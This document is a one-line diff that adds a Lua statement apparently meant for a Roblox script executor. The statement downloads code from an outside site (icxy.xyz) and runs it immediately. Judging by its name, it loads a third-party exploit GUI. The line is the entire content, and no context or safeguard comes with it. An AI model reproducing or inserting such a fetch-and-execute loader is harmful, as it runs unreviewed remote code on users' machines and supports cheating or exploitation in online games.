@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://icxy.xyz/NovaGui/NovaMimic", true))()
